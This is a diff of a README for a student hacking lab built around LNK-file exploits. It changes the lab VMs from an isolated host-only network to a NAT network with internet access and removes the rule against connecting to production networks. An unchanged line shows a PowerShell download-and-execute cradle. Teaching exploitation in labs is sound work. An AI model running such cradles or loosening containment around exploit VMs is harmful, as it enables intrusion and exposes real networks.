@@ -97,9 +97,10 @@ cd /vagrant/exploits/lnk
 
 ### Network Configuration
 
-- **Network Type**: Host-Only (192.168.56.0/24)
-- **Isolation**: Complete (no internet access from VMs)
-- **Connectivity**: VM-to-VM communication enabled
+- **Network Type**: NAT Network (192.168.56.0/24)
+- **Network Name**: LNK_Exploit_Lab_Network
+- **Configuration**: Single adapter per VM (simpler setup)
+- **Connectivity**: VM-to-VM communication + Internet access
 - **Verified**: Automatic connectivity testing during setup
 
 ### Exploit Materials
@@ -186,7 +187,7 @@ cd ethical-hacking-student-lab
 The script will:
 1. Check prerequisites
 2. Prepare exploits directory
-3. Configure VirtualBox network
+3. Create VirtualBox NAT Network
 4. Build Kali Linux VM (5-10 min)
 5. Build Windows VM (20-30 min)
 6. Verify connectivity between VMs
@@ -399,13 +400,13 @@ ethical-hacking-student-lab/
 
 ### Best Practices
 
-- Use in isolated environment (host-only network)
+- Use in isolated lab environment (NAT Network)
 - Keep VM snapshots for easy reset
 - Document your findings professionally
 - Understand defensive countermeasures
 - Never use on unauthorized systems
 - Never share malicious files outside lab
-- Never connect to production networks
+- VMs have internet but are isolated from host network
 
 ---
 
@@ -460,8 +461,8 @@ df -h  # Check disk space
 # Verify connectivity from Kali
 ping 192.168.56.102
 
-# Recreate network if needed
-VBoxManage hostonlyif remove vboxnet0
+# Recreate NAT Network if needed
+VBoxManage natnetwork remove --netname LNK_Exploit_Lab_Network
 ./setup.sh
 ```
 
@@ -482,7 +483,7 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://1
 - **Learning Time**: 4-8 hours (complete lab)
 - **Reset Time**: 30 seconds
 - **Disk Usage**: ~30GB (running VMs)
-- **Network Isolation**: 100% (host-only network)
+- **Network Type**: NAT Network (VM-to-VM + Internet)
 
 ---
 
@@ -604,7 +605,7 @@ See [LICENSE](LICENSE) file for details.
 - ONE-COMMAND SETUP - Complete automation
 - LOCAL VMs - No cloud, no costs
 - FAST RESET - 30-second snapshot restore
-- ISOLATED NETWORK - Safe learning environment, verified connectivity
+- NAT NETWORK - Single adapter setup with VM-to-VM + Internet
 - PRE-GENERATED EXPLOITS - Ready to use
 - SOCIAL ENGINEERING - Real-world attack scenario
 - COMPREHENSIVE DOCS - Step-by-step guides
